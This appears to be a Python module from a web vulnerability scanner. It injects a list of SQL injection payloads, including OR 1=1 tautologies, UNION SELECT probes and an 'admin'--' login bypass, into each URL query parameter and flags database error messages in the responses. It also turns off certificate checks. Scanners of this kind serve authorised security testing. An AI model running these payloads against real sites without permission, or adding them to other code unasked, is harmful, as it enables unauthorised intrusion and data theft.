import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "admin'--",
    "' AND 1=0--",
]

ERROR_SIGNATURES = [
    "mysql_fetch",
    "sql syntax",
    "mysql_num_rows",
    "syntax error",
    "unclosed quotation",
    "microsoft ole db",
    "odbc sql",
    "sqlite_master",
    "pg_query",
    "quoted string not properly terminated",
    "invalid query",
    "warning: mysql",
    "supplied argument is not a valid mysql",
    "you have an error in your sql syntax",
]


def test_sqli(url, timeout=5):
    """
    Tests URL parameters for SQL Injection.
    Returns list of findings.
    """
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return findings

    for param in params:
        for payload in PAYLOADS:
            modified_params = params.copy()
            modified_params[param] = payload

            new_query = urlencode(modified_params, doseq=True)
            new_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            try:
                response = requests.get(new_url, timeout=timeout, verify=False)
                body = response.text.lower()

                for sig in ERROR_SIGNATURES:
                    if sig in body:
                        findings.append({
                            "type": "SQL Injection",
                            "severity": "Critical 🔴",
                            "param": param,
                            "payload": payload,
                            "url": new_url,
                            "evidence": sig
                        })
                        break

            except Exception:
                continue

    return findings
